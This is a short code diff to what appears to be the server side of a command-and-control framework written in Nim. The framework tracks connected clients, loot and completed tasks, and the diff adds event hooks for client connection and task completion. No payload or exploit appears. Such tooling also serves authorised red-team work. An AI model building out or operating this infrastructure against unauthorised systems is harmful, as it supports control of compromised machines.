@@ -2,7 +2,7 @@ import asyncdispatch, asyncfutures, strutils, strformat, json, base64, md5, tabl
 
 import pixie, ws
 
-import types, logging, communication, loot, handleResponse
+import types, logging, communication, loot, handleResponse, events
 
 proc generateClientHash(c: C2Client): string =
   getMD5(
@@ -74,6 +74,7 @@ proc processMessage*(client: ref C2Client, response: JsonNode) {.async.} =
           cReconnected client[]
         if not client.loaded:
           client.loaded = true
+          onClientConnected(client[])
           cConnected client[]
       of "output":
         infoLog $client[] & " completed task " & task.action
@@ -123,7 +124,9 @@ proc processMessage*(client: ref C2Client, response: JsonNode) {.async.} =
     #     writeFile(filePath, decode response["data"]["contents"].getStr())
     #     infoLog "received file " & name & ext & " from " & $client[]
     #     # logClientOutput client[], "DOWNLOAD", response["data"]["contents"].getStr()
+    
     task.markAsCompleted(response)
+    onClientTaskCompleted(client[], task)
     for wsConnection in client.server.wsConnections:
       if wsConnection.readyState == Open:
         discard wsConnection.send $(%*{
